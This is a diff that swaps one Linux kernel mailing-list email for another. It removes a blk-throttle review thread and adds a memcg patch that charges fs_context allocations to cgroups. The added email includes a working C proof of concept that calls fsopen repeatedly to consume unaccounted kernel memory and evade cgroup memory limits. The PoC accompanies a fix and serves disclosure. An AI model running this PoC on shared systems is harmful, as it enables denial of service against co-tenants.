@@ -1,111 +1,122 @@
-From: brookxu <brookxu.cn@gmail.com>
-Subject: Re: [PATCH] blk-throtl: optimize IOPS throttle for large IO scenarios
-Date: Sat, 17 Jul 2021 07:07:25 +0800
-Message-ID: <9d8b584a-738b-a0a8-ea8c-e617c2f79408@gmail.com>
-References: <1626416569-30907-1-git-send-email-brookxu.cn@gmail.com>
- <YPGvIzZUI+QxP1js@mtj.duckdns.org>
-Mime-Version: 1.0
-Content-Transfer-Encoding: 7bit
-Return-path: <linux-block-owner@vger.kernel.org>
+From: Yutian Yang <nglaive-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
+Subject: [PATCH] memcg: charge fs_context and legacy_fs_context
+Date: Sat, 17 Jul 2021 06:20:01 -0400
+Message-ID: <1626517201-24086-1-git-send-email-nglaive@gmail.com>
+Return-path: <cgroups-owner-u79uwXL29TY76Z2rM5mHXA@public.gmane.org>
 DKIM-Signature: v=1; a=rsa-sha256; c=relaxed/relaxed;
         d=gmail.com; s=20161025;
-        h=subject:to:cc:references:from:message-id:date:user-agent
-         :mime-version:in-reply-to:content-language:content-transfer-encoding;
-        bh=P6K+M5gqphiIlNgiFVLzyTugz5hPofZVAtQFiBp7d9s=;
-        b=ullVU331i6gIy4bDcdWB3Z/mYU0uuO8Zz4+zTPF4DwwlLYBpWuoLo8phBHSXV0zQ7I
-         SnHGjhyqsblUks+TDqDyRg4ZJkN2L9qsQLpMeWKT7t2h8zLaPWdo1UYACdUf3Xt6tIwd
-         xB4cZZL3MNrmfbw7bGVtnvkjs5Vu7ZmfUO4pZ8XbSiiJeBdR3nAAJ+Su2ue+vfNRElSD
-         5PG0YGgodlVwx9uT7QnwAZcpoSzxV7h1nEUvVATn3P0i1EsFusZbwh3n3m8MC2cgND5M
-         fw4uP+kNHZBoBmDmHLFdtj6j4Wj3usLgezpO6JfVgH0i+0WPB26yOjAL/vNUUtDFWces
-         mi6Q==
-In-Reply-To: <YPGvIzZUI+QxP1js@mtj.duckdns.org>
-Content-Language: en-US
+        h=from:to:cc:subject:date:message-id;
+        bh=+StolKAcDufVlmzojkSC3TjMvCFftVBsdtQJ52EleJY=;
+        b=Jns2zr2mXKa/1SI1vWueB4vMVJ2ot3Vw405+C5xjcQU4KrIEF5mq7ltcWCbKzf5UdS
+         aXFUOSLIdbtzDS41F64DGUbAl2t8cXIfxRUTGCsALub42QITeLC1d9mYPli6gMakRYC2
+         ynKij2pzLRF+9ckXst5vlg9aasuqT1f9dhvTKSSTS9ssKvZ34W3g3vdgJWO9OjZe8tFG
+         MW5TAEOY+O1eHxeB0d1HXSWe1jYoIs/3fqkWYabv4lriA9HWEGKxh6KHfhj+TwppX0zi
+         MSaarbS23cUIAjyYtxrK4RLHfHNX9AJ8k+wda1fEJQjXIUpXVN4QYFqAVhyoylaMjc1W
+         472Q==
 List-ID: <cgroups.vger.kernel.org>
+MIME-Version: 1.0
 Content-Type: text/plain; charset="us-ascii"
-To: Tejun Heo <tj@kernel.org>
-Cc: axboe@kernel.dk, cgroups@vger.kernel.org, linux-block@vger.kernel.org, linux-kernel@vger.kernel.org
+Content-Transfer-Encoding: 7bit
+To: mhocko-DgEjT+Ai2ygdnm+yROfE0A@public.gmane.org, hannes-druUgvl0LCNAfugRpC6u6w@public.gmane.org, vdavydov.dev-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org
+Cc: cgroups-u79uwXL29TY76Z2rM5mHXA@public.gmane.org, linux-mm-Bw31MaZKKs3YtjvyW6yDsg@public.gmane.org, shenwenbo-Y5EWUtBUdg4nDS1+zs4M5A@public.gmane.org, Yutian Yang <nglaive-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
+
+This patch adds accounting flags to fs_context and legacy_fs_context 
+allocation sites so that kernel could correctly charge these objects.
+
+We have written a PoC to demonstrate the effect of the missing-charging
+bugs. The PoC takes around 1,200MB unaccounted memory, while it is charged
+for only 362MB memory usage. We evaluate the PoC on QEMU x86_64 v5.2.90
++ Linux kernel v5.10.19 + Debian buster. All the limitations including
+ulimits and sysctl variables are set as default. Specifically, the hard 
+NOFILE limit and nr_open in sysctl are both 1,048,576.
+
+/*------------------------- POC code ----------------------------*/
+
+#define _GNU_SOURCE
+#include <sys/types.h>
+#include <sys/file.h>
+#include <time.h>
+#include <sys/wait.h>
+#include <stdint.h>
+#include <stdlib.h>
+#include <unistd.h>
+#include <stdio.h>
+#include <signal.h>
+#include <sched.h>
+#include <fcntl.h>
+#include <linux/mount.h>
+
+#define errExit(msg)    do { perror(msg); exit(EXIT_FAILURE); \
+                        } while (0)
+
+#define STACK_SIZE (8 * 1024)
+#ifndef __NR_fsopen
+#define __NR_fsopen 430
+#endif
+static inline int fsopen(const char *fs_name, unsigned int flags)
+{
+        return syscall(__NR_fsopen, fs_name, flags);
+}
+
+static char thread_stack[512][STACK_SIZE];
+
+int thread_fn(void* arg)
+{
+  for (int i = 0; i< 800000; ++i) {
+    int fsfd = fsopen("nfs", FSOPEN_CLOEXEC);
+    if (fsfd == -1) {
+      errExit("fsopen");
+    }
+  }
+  while(1);
+  return 0;
+}
+
+int main(int argc, char *argv[]) {
+  int thread_pid;
+  for (int i = 0; i < 1; ++i) {
+    thread_pid = clone(thread_fn, thread_stack[i] + STACK_SIZE, \
+      SIGCHLD, NULL);
+  }
+  while(1);
+  return 0;
+}
+
+/*-------------------------- end --------------------------------*/
 
 
+Thanks!
+Yutian Yang,
+Zhejiang University
 
-Tejun Heo wrote on 2021/7/17 0:09:
-> Hello,
-> 
-> On Fri, Jul 16, 2021 at 02:22:49PM +0800, brookxu wrote:
->> diff --git a/block/blk-merge.c b/block/blk-merge.c
->> index a11b3b5..86ff943 100644
->> --- a/block/blk-merge.c
->> +++ b/block/blk-merge.c
->> @@ -348,6 +348,8 @@ void __blk_queue_split(struct bio **bio, unsigned int *nr_segs)
->>  		trace_block_split(split, (*bio)->bi_iter.bi_sector);
->>  		submit_bio_noacct(*bio);
->>  		*bio = split;
->> +
->> +		blk_throtl_recharge_bio(*bio);
-> 
-> I don't think we're holding the queue lock here.
 
-sorry, some kind of synchronization mechanism is really needed here. But the use of queue_lock
-here may be unsafe, since it is difficult for us to control the lock on the split path.
+Signed-off-by: Yutian Yang <nglaive-Re5JQEeQqe8AvxtiuMwx3w@public.gmane.org>
+---
+ fs/fs_context.c | 4 ++--
+ 1 file changed, 2 insertions(+), 2 deletions(-)
 
->>  	}
->>  }
->>  
->> diff --git a/block/blk-throttle.c b/block/blk-throttle.c
->> index b1b22d8..1967438 100644
->> --- a/block/blk-throttle.c
->> +++ b/block/blk-throttle.c
->> @@ -2176,6 +2176,40 @@ static inline void throtl_update_latency_buckets(struct throtl_data *td)
->>  }
->>  #endif
->>  
->> +void blk_throtl_recharge_bio(struct bio *bio)
->> +{
->> +	bool rw = bio_data_dir(bio);
->> +	struct blkcg_gq *blkg = bio->bi_blkg;
->> +	struct throtl_grp *tg = blkg_to_tg(blkg);
->> +	u32 iops_limit = tg_iops_limit(tg, rw);
->> +
->> +	if (iops_limit == UINT_MAX)
->> +		return;
->> +
->> +	/*
->> +	 * If previous slice expired, start a new one otherwise renew/extend
->> +	 * existing slice to make sure it is at least throtl_slice interval
->> +	 * long since now. New slice is started only for empty throttle group.
->> +	 * If there is queued bio, that means there should be an active
->> +	 * slice and it should be extended instead.
->> +	 */
->> +	if (throtl_slice_used(tg, rw) && !(tg->service_queue.nr_queued[rw]))
->> +		throtl_start_new_slice(tg, rw);
->> +	else {
->> +		if (time_before(tg->slice_end[rw],
->> +		    jiffies + tg->td->throtl_slice))
->> +			throtl_extend_slice(tg, rw,
->> +				jiffies + tg->td->throtl_slice);
->> +	}
->> +
->> +	/* Recharge the bio to the group, as some BIOs will be further split
->> +	 * after passing through the throttle, causing the actual IOPS to
->> +	 * be greater than the expected value.
->> +	 */
->> +	tg->last_io_disp[rw]++;
->> +	tg->io_disp[rw]++;
->> +}
-> 
-> But blk-throtl expects queue lock to be held.
-> 
-> How about doing something simpler? Just estimate how many bios a given bio
-> is gonna be and charge it outright? The calculation will be duplicated
-> between the split path but that seems like the path of least resistance
-> here.
+diff --git a/fs/fs_context.c b/fs/fs_context.c
+index 2834d1afa..4858645ca 100644
+--- a/fs/fs_context.c
++++ b/fs/fs_context.c
+@@ -231,7 +231,7 @@ static struct fs_context *alloc_fs_context(struct file_system_type *fs_type,
+ 	struct fs_context *fc;
+ 	int ret = -ENOMEM;
+ 
+-	fc = kzalloc(sizeof(struct fs_context), GFP_KERNEL);
++	fc = kzalloc(sizeof(struct fs_context), GFP_KERNEL_ACCOUNT);
+ 	if (!fc)
+ 		return ERR_PTR(-ENOMEM);
+ 
+@@ -631,7 +631,7 @@ const struct fs_context_operations legacy_fs_context_ops = {
+  */
+ static int legacy_init_fs_context(struct fs_context *fc)
+ {
+-	fc->fs_private = kzalloc(sizeof(struct legacy_fs_context), GFP_KERNEL);
++	fc->fs_private = kzalloc(sizeof(struct legacy_fs_context), GFP_KERNEL_ACCOUNT);
+ 	if (!fc->fs_private)
+ 		return -ENOMEM;
+ 	fc->ops = &legacy_fs_context_ops;
+-- 
+2.25.1
 
-I have tried this method, the code redundancy is indeed a bit high, it may not be
-very convenient for code maintenance. In addition to this problem, since we add
-a large value at a time, the fluctuation of IOPS will be relatively large. Since
-blk_throtl_recharge_bio() does not need to participate in the maintenance of the
-state machine, we only need to protect some fields of tg, so can we add a new
-spin_lock to tg instead of queue_lock to solve the synchronization problem ? Just
-a idea, Thanks.
-
-> Thanks.
-> 
